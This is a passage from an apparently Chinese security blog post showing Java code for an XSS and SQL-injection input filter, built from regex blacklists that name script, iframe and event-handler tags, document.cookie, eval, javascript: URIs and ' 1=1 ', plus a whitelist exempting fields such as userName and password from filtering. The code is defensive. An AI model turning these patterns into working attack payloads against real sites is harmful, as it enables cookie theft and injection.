class="string">"&lt;(\\S*)(no)?script|&lt;/(\\S*)(no)?script|&lt;(\\S*)iframe|&lt;(\\S*)img|&lt;(\\S*)svg|&lt;(\\S*)audio|\\.html"</span>, Pattern.CASE_INSENSITIVE});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"window\\.location|window\\.|\\.location|document\\.cookie|document\\.write|document\\.|alert\\(.*?\\)|window\\.open\\(*"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"eval\\((.*?)\\)"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"javascript:|vbscript:|view-source:"</span>, Pattern.CASE_INSENSITIVE});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"( href=)|( src=)|(=wrtice\\()"</span>, Pattern.CASE_INSENSITIVE});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"&lt;+\\s*\\w*\\s*(oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror=|onerroupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmousout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onabort|onactivate|onafterprint|onafterupdate|onbefore|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)+\\s*=+"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 正则匹配上：清空参数匹配项</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Object[]&gt; getXssPatternToEmptyList() {</span><br><span class="line">        List&lt;Object[]&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object[]&gt;();</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"expression\\((.*?)\\)"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"&lt;(\"[^\"]*\"|\'[^\']*\'|[^\'\"&gt;])*&gt;"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"&amp;.*?|$.*?|CR.*?|LF.*?|\\.*?"</span>, Pattern.CASE_INSENSITIVE});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%22"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%27"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%3E"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%3e"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%3C"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%3c"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"&lt;"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"&gt;"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"%"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"$"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\""</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\'"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\""</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"'"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\\+"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\\\\"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\\("</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"\\)"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">" and "</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">" or "</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">" 1=1 "</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"(\\bhref(?=\\s*=\\s*['\"]?\\s*javascript:))|(\\bdata(?!:\\s*image/))|(^[^&lt;]*&lt;(?=/textarea\\s*&gt;))|(&lt;(?=(script)|(/script)))|(\\b(onafterprint|onbeforeprint|onbeforeunload|onerror|onhaschange|onload|onmessage|onoffline|ononline|onpagehide|onpageshow|onpopstate|onredo|onresize|onstorage|onundo|onunload|onblur|onchange|oncontextmenu|onfocus|onformchange|onforminput|oninput|oninvalid|onreset|onreset|onsubmit|onkey\\w*|onclick|ondblclick|ondrag\\w*|ondrop|onmouse\\w*|onscroll|ontouch\\w*)(?=(\\s*)=))"</span>, Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFilterConstant</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; noFilterList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line">        noFilterList.add(<span class="string">"res_create_user_id"</span>);</span><br><span class="line">        noFilterList.add(<span class="string">"(.*?)DataListStr(.*?)"</span>);</span><br><span class="line">        noFilterList.add(<span class="string">"proc_dxid"</span>);</span><br><span class="line">        noFilterList.add(<span class="string">"userName"</span>);</span><br><span class="line">        noFilterList.add(<span class="string">"password"</span>);</span><br><span class="line">        noFilterList.add(<span class="string">"sortParam"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/20250619/d188606.html" rel="prev" title="SSL漏洞处理">
                  <i class="fa fa-angle-left"></i> SSL漏洞处理
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/20250619/96960bec.html" rel="next" title="CSRF漏洞处理">
                  CSRF漏洞处理 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Alisa</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
